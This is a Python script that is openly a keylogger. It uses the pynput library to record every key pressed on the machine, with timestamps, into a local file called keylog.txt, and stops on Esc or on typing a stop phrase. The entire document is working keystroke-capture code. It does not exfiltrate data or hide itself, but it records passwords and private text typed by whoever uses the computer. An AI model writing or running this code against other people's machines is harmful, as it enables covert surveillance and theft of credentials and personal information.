import logging
import threading
import time
from pynput import keyboard

# Configure logging with formatted output
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Stop flag
running = True
key_buffer = ""

def on_press(key):
    global running, key_buffer
    try:
        char = key.char
        key_buffer += char  # Collect characters in a buffer

        logging.info(f"Key pressed: {char}")

        # Check if stop command is entered
        if "keylogger_stop" in key_buffer:
            running = False
            return False

    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    global running
    if key == keyboard.Key.esc:  # Stop logging when Esc is pressed
        running = False
        return False

def stop_listener():
    while running:
        time.sleep(1)
    print("Keylogger stopped.")

# Run the listener in a separate thread
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener_thread = threading.Thread(target=listener.start)
stop_thread = threading.Thread(target=stop_listener)

listener_thread.start()
stop_thread.start()

listener_thread.join()
stop_thread.join()
